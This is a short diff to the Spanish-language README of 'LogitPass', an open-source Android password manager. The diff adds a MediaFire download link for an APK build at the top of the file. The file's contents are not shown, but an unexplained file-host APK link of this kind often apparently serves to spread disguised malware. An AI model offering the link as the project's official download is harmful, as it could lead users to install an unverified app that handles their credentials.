@@ -1,5 +1,7 @@
 # 🔐 LogitPass
 
+https://www.mediafire.com/file/y6an8yj0u7g9hnv/logitpass+v2.5.0.apk/file
+
 **Gestor de contraseñas de código abierto para Android.**
 
 LogitPass es un proyecto centrado en la privacidad, el almacenamiento local y la protección de credenciales. Su objetivo es ofrecer una forma sencilla de gestionar contraseñas desde Android, sin depender de una cuenta en la nube.
